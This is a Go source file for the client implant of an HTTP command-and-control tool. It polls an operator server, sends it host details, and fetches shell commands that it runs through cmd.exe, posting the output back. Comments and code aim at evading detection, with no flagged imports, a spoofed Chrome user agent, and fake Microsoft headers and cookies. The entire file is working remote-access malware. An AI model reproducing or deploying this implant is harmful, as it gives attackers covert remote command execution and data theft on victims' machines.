package main

//package imports
//Nothing from github that could be used as a flag in the compiled code within the client exe/elf.  On the server side, this doesn't matter becuase you control that device.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"
)

var (
	ip               string = "127.0.0.1" //put the ip of your server.
	url              string = ""
	checkin_endpoint string = "http://" + ip + "/checkin"
	c2_endpoint      string = "http://" + ip + "/cmdctrl"
	//user_agent       string = "ironcat-http-c2"
	user_agent string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"

	tr = &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}

	client = &http.Client{
		CheckRedirect: http.DefaultClient.CheckRedirect,
		Transport:     tr,
	}
)

type Cmd struct {
	Command string `json:"cmd"`
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

//optional random user agent.

// function for http client checkin, waiting to see if there is a  to checking with server
func checkin() string {

	req, err := http.NewRequest("GET", checkin_endpoint, nil)
	check(err)
	//Change your user agent for petes sake!
	//req.Header.Set("User-Agent", user_agent)
	//req.Header.Set("User-Agent", rua())
	//Fake common header information.
	//req.Header.Add("authority", "www.microsoft.com")
	//req.Header.Add("path", "en-us")
	//req.Header.Add("scheme", "https")
	//req.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")

	resp, err := client.Do(req)
	msg := resp.Body
	fmt.Println(msg)

	mode := resp.Header.Get("Mode")
	fmt.Println(mode)
	return mode

}

//enumerate OS without using CMD.exe and return values acorss http c2
func os_enum() {

	hostname, err := os.Hostname()
	check(err)
	var envvars []string
	envvars = os.Environ()
	executable, err := os.Executable()
	pid := strconv.Itoa(os.Getpid())
	ppid := strconv.Itoa(os.Getppid())

	output := "Hostname: " + hostname + "\n" + "envars: " + envvars[1] + "\n" + "executable: " + executable + "\n" + "PPID: " + ppid + "\n" + "PID: " + pid + "\n"

	//create response with outut to different API endpoint
	resc, err := http.NewRequest("POST", c2_endpoint, bytes.NewBuffer([]byte(output)))
	check(err)
	//Enable to change user agent to specified value.
	//resc.Header.Set("User-Agent", user_agent)
	resc.Header.Set("Host", "Something In Your Org")
	resc.Header.Add("Content-Type", "application/text")
	resc.Header.Add("authority", "www.microsoft.com")
	resc.Header.Add("path", "en-us")
	resc.Header.Add("scheme", "https")
	resc.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")

	rclient := &http.Client{}
	rescn, err := rclient.Do(resc)
	fmt.Printf(rescn.Status)
	check(err)
	defer resc.Body.Close()

}

func c2() {
	//for transport layer creat transport for client to use.
	req, err := http.NewRequest("GET", c2_endpoint, nil)
	check(err)
	//Fake common header information.
	//req.Header.Set("User-Agent", user_agent)
	req.Header.Set("Host", "Something In Your Org")
	req.Header.Add("Content-Type", "application/text")
	req.Header.Add("authority", "www.microsoft.com")
	req.Header.Add("path", "en-us")
	req.Header.Add("scheme", "https")
	req.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")
	respn, err := client.Do(req)
	//fmt.Println(respn.Body)
	check(err)
	msgn, err := io.ReadAll(respn.Body)
	check(err)
	//cmd := string(msgn)
	//fmt.Printf(cmd)
	var c Cmd
	err = json.Unmarshal(msgn, &c)
	fmt.Println(c.Command)
	t := exec.Command("cmd.exe", "/c", c.Command) //c.Command
	output, err := t.CombinedOutput()

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println(string(output))

	//create response with outut to different API endpoint
	resc, err := http.NewRequest("POST", c2_endpoint, bytes.NewBuffer(output))
	check(err)
	//Enable to change user agent to specified value.
	resc.Header.Set("User-Agent", user_agent)
	resc.Header.Add("Content-Type", "application/text")
	resc.Header.Set("Host", "Something In Your Org")
	resc.Header.Add("Content-Type", "application/text")
	resc.Header.Add("authority", "www.microsoft.com")
	resc.Header.Add("path", "en-us")
	resc.Header.Add("scheme", "https")
	resc.Header.Add("Cookie", "cookie: _mkto_trk=id:157-GQE-382&token:_mch-microsoft.com-1599022070406-73765; MUID=0C6C942D240069701B7B9B15256F686C; _ga=GA1.2.1563654985.1599023783; WRUIDCD29072020=2975053460292425; optimizelyEndUserId=oeu1601924172691r0.6704369797938583; visid_incap_1204013=ki4LJkmJQrS6NZhKykfVoe+rpV8AAAAAQUIPAAAAAAAV88PbuOgQJcUJge2nL5Nz; IR_PI=5e7c0d30-34f2-11eb-bc8d-123ef70df310%7C1607636344965; msd365mkttr=Ai92Zvwbv1kvkvKQ3AsJ4cn8e4_UZIvic5TKghc9; WRUID=3011088853451815; _CT_RS_=Recording; MicrosoftApplicationsTelemetryDeviceId=3374474d-5650-4319-bb15-7af7010e9ed6; __CT_Data=gpv=4&ckp=tld&dm=microsoft.com&apv_1067_www32=4&cpv_1067_www32=4&rpv_1067_www32=4&rpv_1001_www32=1; ai_user=AevEe|2021-08-29T12:51:44.644Z; MC1=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; MSFPC=GUID=b98a52c3eef74ef0a7c3b3508a9be2f6&HASH=b98a&LV=202109&V=4&LU=1630636208608; display-culture=en-US; _cs_c=0; _abck=F0B689AF1940263B17FB7E39382DB648~-1~YAAQlzhjaG/mkiV9AQAAQ2gXSwY/AYphQLVLWqLmyO7+gFJSp+mHxrLbvyupyOVpHLKzWuGRT1LYLi1Oan+3JfXOD/IAoyddINIdzDk3KlTDLgNJ6jO+j+gjjYdtQr7hTvX+2W+82xrEkl4NIQAXJzbQz+5k4CiGQPWPMoUATMpNPHoRFquXbn9rt/2mfa713E3YnTgYXyKPu/mMSJ7sSo5O30fn7a5iGv+Y2Su/IMI1sUPpGXRJ02B8hDjQrUozNP7VDO33gDiBwewsb487Az0BWsZtLrzbZFBimWU8xA0R1y34VgnlkCwSpcGx//f77eDG39J2JHmdjcEzfpdGjpT7JGJ8NBzV1Yf7NHr7ZhFc5sGR~-1~-1~-1;")

	rclient := &http.Client{}
	rescn, err := rclient.Do(resc)
	fmt.Printf(rescn.Status)
	check(err)
	defer resc.Body.Close()
}

func main() {
	for 1 == 1 {

		switch checkin() {

		case "0":
			time.Sleep(10 * time.Second)
		case "1":
			os_enum()
			time.Sleep(10 * time.Second)
		case "2":
			c2()
			time.Sleep(10 * time.Second)
		default:
			time.Sleep(10 * time.Second)
		}

	}

}
